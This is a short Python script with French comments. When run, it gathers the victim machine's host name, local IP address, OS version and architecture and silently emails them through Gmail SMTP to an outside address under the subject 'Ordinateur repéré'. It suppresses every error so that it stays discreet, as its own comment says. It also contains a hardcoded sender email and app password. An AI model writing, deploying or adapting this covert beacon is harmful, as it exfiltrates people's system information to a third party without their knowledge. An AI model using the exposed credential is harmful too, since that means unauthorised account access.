import platform
import socket
import smtplib
from email.mime.text import MIMEText

def get_system_info():
    info = {
        "Nom de l'utilisateur": platform.node(),
        "Nom du PC": socket.gethostname(),
        "Adresse IP locale": socket.gethostbyname(socket.gethostname()),
        "Système": platform.system(),
        "Version": platform.version(),
        "Architecture": platform.machine()
    }
    message = "\n".join([f"{k}: {v}" for k, v in info.items()])
    return message

def send_email(subject, body):
    sender_email = "serveur.astroneer.status@gmail.com"
    sender_password = "tzcg cxag pfrx yslw"
    recipient_email = "arthurepk@icloud.com"

    msg = MIMEText(body)
    msg["Subject"] = subject
    msg["From"] = sender_email
    msg["To"] = recipient_email

    try:
        with smtplib.SMTP_SSL("smtp.gmail.com", 465) as server:
            server.login(sender_email, sender_password)
            server.sendmail(sender_email, recipient_email, msg.as_string())
    except Exception as e:
        pass  # Ne rien afficher pour rester discret

if __name__ == "__main__":
    infos = get_system_info()
    send_email("Ordinateur repéré", infos)
